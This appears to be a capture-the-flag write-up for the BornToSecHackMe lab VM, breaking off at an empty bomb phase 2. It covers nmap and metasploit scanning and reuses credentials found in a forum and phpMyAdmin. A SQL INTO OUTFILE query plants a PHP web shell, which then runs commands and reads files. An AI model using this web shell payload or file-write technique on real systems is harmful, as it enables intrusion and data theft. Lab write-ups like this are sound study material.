# writeup1

- ifconfig

result:
```
➜  ~ ifconfig
bridge100: flags=8a63<UP,BROADCAST,SMART,RUNNING,ALLMULTI,SIMPLEX,MULTICAST> mtu 1500
	options=3<RXCSUM,TXCSUM>
	ether f2:2f:4b:00:8c:64 
	inet 192.168.64.1 netmask 0xffffff00 broadcast 192.168.64.255
	inet6 fe80::f02f:4bff:fe00:8c64%bridge100 prefixlen 64 scopeid 0x16 
	inet6 fda8:424a:3d63:d0fe:c9a:6453:629:bbd1 prefixlen 64 autoconf secured 
	Configuration:
		id 0:0:0:0:0:0 priority 0 hellotime 0 fwddelay 0
		maxage 0 holdcnt 0 proto stp maxaddr 100 timeout 1200
		root id 0:0:0:0:0:0 priority 0 ifcost 0 port 0
		ipfilter disabled flags 0x0
	member: vmenet0 flags=3<LEARNING,DISCOVER>
	        ifmaxaddr 0 port 21 priority 0 path cost 0
	nd6 options=201<PERFORMNUD,DAD>
	media: autoselect
	status: active
```

- nmap local network

```
➜  ~ sudo nmap 192.168.64.0-255
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-01 18:24 CEST
Nmap scan report for 192.168.64.2
Host is up (0.0048s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
MAC Address: 66:F1:9A:FE:A6:3A (Unknown)

Nmap scan report for 192.168.64.1
Host is up (0.0030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
5000/tcp open  upnp
7000/tcp open  afs3-fileserver

Nmap done: 256 IP addresses (2 hosts up) scanned in 2.46 seconds
```

- use metasploit for scan port 80

result: we found the forum
```
msf6 auxiliary(scanner/http/dir_webdav_unicode_bypass) > use auxiliary/scanner/http/files_dir 
msf6 auxiliary(scanner/http/files_dir) > set RHOSTS 192.168.64.2
RHOSTS => 192.168.64.2
msf6 auxiliary(scanner/http/files_dir) > run

[*] Using code '404' as not found for files with extension .null
[*] Using code '404' as not found for files with extension .backup
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[*] Using code '404' as not found for files with extension .cfg
[*] Using code '404' as not found for files with extension .class
[*] Using code '404' as not found for files with extension .copy
[*] Using code '404' as not found for files with extension .conf
[*] Using code '404' as not found for files with extension .exe
[*] Using code '404' as not found for files with extension .html
[+] Found http://192.168.64.2:80/index.html 200
[*] Using code '404' as not found for files with extension .htm
[*] Using code '404' as not found for files with extension .ini
[*] Using code '404' as not found for files with extension .log
[*] Using code '404' as not found for files with extension .old
[*] Using code '404' as not found for files with extension .orig
[*] Using code '404' as not found for files with extension .php
[*] Using code '404' as not found for files with extension .tar
[*] Using code '404' as not found for files with extension .tar.gz
[*] Using code '404' as not found for files with extension .tgz
[*] Using code '404' as not found for files with extension .tmp
[*] Using code '404' as not found for files with extension .temp
[*] Using code '404' as not found for files with extension .txt
[*] Using code '404' as not found for files with extension .zip
[*] Using code '404' as not found for files with extension ~
[*] Using code '404' as not found for files with extension 
[+] Found http://192.168.64.2:80/forum 403
[*] Using code '404' as not found for files with extension 
[+] Found http://192.168.64.2:80/forum 403
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- Go to `Problem to login ?` thread et search password

- forum

login: `lmezard`
password: `!q\]Ej?*5K5cy*AJ`

- webmail

login: `laurie@borntosec.net`
password: same as forum

- phpmyadmin

login: `root`
password: `Fg-'kKXBj87E:aJ$`

- Go to phpmyadmin and execute sql command: `SELECT '<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/cmd.php'`

- Go to this url: https://192.168.64.2/forum/templates_c/cmd.php?command=whoami

result: `www-data`

- Check python https://192.168.64.2/forum/templates_c/cmd.php?command=whereis%20python (resources: https://www.urlencoder.org/)

result: `python: /usr/bin/python /usr/bin/python2.7 /etc/python /etc/python2.7 /usr/lib/python2.7 /usr/bin/X11/python /usr/bin/X11/python2.7 /usr/local/lib/python2.7 /usr/include/python2.7 /usr/share/python /usr/share/man/man1/python.1.gz`

- ls the home https://192.168.64.2/forum/templates_c/cmd.php?command=ls%20-la%20%2Fhome

result:
```
total 0 drwxrwx--x 1 www-data root 60 Oct 13 2015 . drwxr-xr-x 1 root root 220 Aug 1 2022 .. drwxr-x--- 2 www-data www-data 31 Oct 8 2015 LOOKATME drwxr-x--- 6 ft_root ft_root 156 Jun 17 2017 ft_root drwxr-x--- 3 laurie laurie 143 Oct 15 2015 laurie drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net 60 Oct 15 2015 laurie@borntosec.net dr-xr-x--- 2 lmezard lmezard 61 Oct 15 2015 lmezard drwxr-x--- 3 thor thor 129 Oct 15 2015 thor drwxr-x--- 4 zaz zaz 147 Oct 15 2015 zaz
```

- ls the folder LOOKATME https://192.168.64.2/forum/templates_c/cmd.php?command=ls%20-lA%20%2Fhome%2FLOOKATME

- Cat the file LOOKATME/password https://192.168.64.2/forum/templates_c/cmd.php?command=cat%20%2Fhome%2FLOOKATME%2Fpassword

`lmezard:G!@M6f4Eatau{sF"`

- Log to ftp with filezilla

result: 2 files
```
README
fun
```

README content: `Complete this little challenge and use the result as password for user 'laurie' to login in ssh`

- find fun

result: it is a tar file

- tar -xvf fun

result: ft_fun folder with many .pcap files

- Execute scripts/regenerate.py in ft_fun folder

result:
```
> python3 Regenerate.py
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
Hashed password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

- Connect to ssh with `ssh laurie@192.168.64.2`

```
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

- Play ./bomb game !

phase_1: `Public speaking is very easy.`
```
(gdb) disas main
(gdb) disas phase_1
(gdb) x /s 0x80497c0
0x80497c0:	 "Public speaking is very easy."
```

phase_2:
```

```